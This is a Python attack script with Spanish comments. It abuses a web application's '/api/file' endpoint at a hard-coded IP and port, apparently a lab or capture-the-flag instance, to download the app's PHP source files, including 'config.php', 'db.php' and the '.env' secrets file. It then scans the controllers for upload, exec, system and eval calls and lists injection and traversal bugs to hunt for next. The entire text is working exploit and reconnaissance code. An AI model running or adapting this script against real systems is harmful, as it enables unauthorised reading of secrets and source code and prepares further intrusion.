#!/usr/bin/env python3
import requests
import json
import os

base_url = "http://94.237.57.115:46418"

print("=== Obteniendo todo el código fuente ===\n")

# Archivos importantes basados en el index.php
files = [
    "app/index.php",
    "app/Router.php",
    "app/Controllers/AuthController.php",
    "app/Controllers/OperatorController.php",
    "app/Controllers/AdminController.php",
    "app/Controllers/ApiController.php",
    "app/Models/User.php",
    "app/Models/Infrastructure.php",
    "app/Models/Report.php",
    "app/Views/landing.php",
    "app/Views/report.php",
    "app/Views/reports.php",
    "app/config.php",
    "app/db.php",
    "app/.env"
]

os.makedirs("source_code", exist_ok=True)

for file_path in files:
    print(f"Descargando: {file_path}")
    r = requests.get(f"{base_url}/api/file", params={"path": file_path})
    
    if r.status_code == 200:
        try:
            data = r.json()
            if 'content' in data:
                content = data['content']
                
                # Crear estructura de directorios
                safe_path = file_path.replace("app/", "")
                dir_path = os.path.dirname(safe_path)
                if dir_path:
                    os.makedirs(f"source_code/{dir_path}", exist_ok=True)
                
                # Guardar archivo
                with open(f"source_code/{safe_path}", "w") as f:
                    f.write(content)
                print(f"  ✓ Guardado: source_code/{safe_path}")
                
                # Si es un controlador importante, mostrar parte del contenido
                if "Controller" in file_path:
                    lines = content.split('\n')
                    for i, line in enumerate(lines):
                        if 'upload' in line.lower() or 'file' in line.lower() or 'exec' in line.lower() or 'system' in line.lower() or 'eval' in line.lower():
                            print(f"  ⚠️  Línea {i+1}: {line.strip()[:100]}")
                            
        except json.JSONDecodeError:
            if "error" not in r.text:
                print(f"  Error decodificando JSON")
    else:
        print(f"  ✗ No encontrado")

print("\n=== Resumen ===")
print("Archivos descargados en el directorio 'source_code/'")
print("Busca vulnerabilidades relacionadas con:")
print("- File upload sin validación adecuada")
print("- Command injection")
print("- SQL injection")
print("- Path traversal")
print("- XSS")